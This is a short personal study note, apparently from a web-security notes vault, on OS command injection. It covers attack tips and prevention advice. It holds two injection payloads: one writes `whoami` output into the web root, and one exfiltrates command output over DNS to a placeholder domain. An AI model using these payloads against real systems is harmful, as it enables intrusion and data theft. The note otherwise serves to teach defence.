---
tags: ⚡
topic: [[Web-Sec]]
---

# OS command injection

---

## Tips & Tricks

- redirecting output to web root
	- if app serves static resources from `/var/www/static` then you can redirect the output there
	- `& whoami > /var/www/static/whoami.txt &`
	- afterwards, you can view contents of file by accessing the URL
- use out-of-band techniques
	- exfiltrate through DNS: `|| nslookup $(whoami).subdomain.domain.com || `

## Prevention
Never call out to OS commands from application-layer code. There are alternate ways of implementing the required functionality using safer platform APIs.

If unavoidable, you need to have a strong input validation system. For example, validating:
- against a whitelitest of permitted values
- that the input is a number
- that the input contains only alpahnumeric chars & no other syntax or whitespace

> Never attempt to sanitize input by escaping shell metacharacters. This is just too error-prone and vulneable to being bypassed by a skilled attacker

---

## References

## See Also
[[Web-Sec]]

